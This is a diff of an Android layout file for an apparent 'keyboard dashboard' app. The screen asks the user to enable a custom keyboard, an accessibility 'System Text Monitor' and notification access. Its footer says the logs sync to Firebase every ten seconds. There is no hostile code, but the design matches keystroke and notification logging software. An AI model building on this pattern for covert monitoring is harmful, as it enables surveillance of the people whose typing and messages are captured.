@@ -1,46 +1,145 @@
 <?xml version="1.0" encoding="utf-8"?>
-<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
-    android:orientation="vertical"
-    android:padding="24dp"
-    android:gravity="center">
+    android:fillViewport="true"
+    android:background="#F5F5F5">
 
-    <TextView
+    <LinearLayout
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:text="My Keyboard Setup"
-        android:textSize="24sp"
-        android:textStyle="bold"
-        android:gravity="center"
-        android:layout_marginBottom="12dp" />
+        android:orientation="vertical"
+        android:padding="20dp">
 
-    <TextView
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="Please complete the setup steps below to enable system-wide logging and monitoring."
-        android:textSize="14sp"
-        android:gravity="center"
-        android:layout_marginBottom="32dp" />
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="My Keyboard Dashboard"
+            android:textSize="26sp"
+            android:textStyle="bold"
+            android:textColor="#333333"
+            android:gravity="center"
+            android:layout_marginTop="16dp"
+            android:layout_marginBottom="8dp" />
 
-    <Button
-        android:id="@+id/btnEnableKeyboard"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="1. Enable &amp; Select Keyboard"
-        android:layout_marginBottom="16dp" />
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="Manage your system-wide monitoring and keyboard services below."
+            android:textSize="14sp"
+            android:textColor="#666666"
+            android:gravity="center"
+            android:layout_marginBottom="24dp" />
 
-    <Button
-        android:id="@+id/btnEnableAccessibility"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="2. Enable System Text Monitor (Accessibility)"
-        android:layout_marginBottom="16dp" />
+        <!-- Card 1: Keyboard -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
+            android:background="@drawable/key_background"
+            android:padding="16dp"
+            android:layout_marginBottom="16dp">
 
-    <Button
-        android:id="@+id/btnEnableNotification"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="3. Enable Notification Access" />
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="1. Custom Keyboard"
+                android:textStyle="bold"
+                android:textSize="16sp"
+                android:textColor="#000000" />
 
-</LinearLayout>
+            <TextView
+                android:id="@+id/txtKeyboardStatus"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="Status: Checking..."
+                android:textSize="14sp"
+                android:textColor="#D32F2F"
+                android:layout_marginTop="4dp"
+                android:layout_marginBottom="12dp" />
+
+            <Button
+                android:id="@+id/btnEnableKeyboard"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="Configure Keyboard" />
+        </LinearLayout>
+
+        <!-- Card 2: Accessibility -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
+            android:background="@drawable/key_background"
+            android:padding="16dp"
+            android:layout_marginBottom="16dp">
+
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="2. System Text Monitor (Accessibility)"
+                android:textStyle="bold"
+                android:textSize="16sp"
+                android:textColor="#000000" />
+
+            <TextView
+                android:id="@+id/txtAccessibilityStatus"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="Status: Checking..."
+                android:textSize="14sp"
+                android:textColor="#D32F2F"
+                android:layout_marginTop="4dp"
+                android:layout_marginBottom="12dp" />
+
+            <Button
+                android:id="@+id/btnEnableAccessibility"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="Enable Accessibility" />
+        </LinearLayout>
+
+        <!-- Card 3: Notification Access -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
+            android:background="@drawable/key_background"
+            android:padding="16dp"
+            android:layout_marginBottom="24dp">
+
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="3. Notification Access"
+                android:textStyle="bold"
+                android:textSize="16sp"
+                android:textColor="#000000" />
+
+            <TextView
+                android:id="@+id/txtNotificationStatus"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="Status: Checking..."
+                android:textSize="14sp"
+                android:textColor="#D32F2F"
+                android:layout_marginTop="4dp"
+                android:layout_marginBottom="12dp" />
+
+            <Button
+                android:id="@+id/btnEnableNotification"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="Enable Notifications" />
+        </LinearLayout>
+
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="All logs are synced to Firebase Realtime Database in 10-second batches."
+            android:textSize="12sp"
+            android:textColor="#888888"
+            android:gravity="center" />
+
+    </LinearLayout>
+</ScrollView>
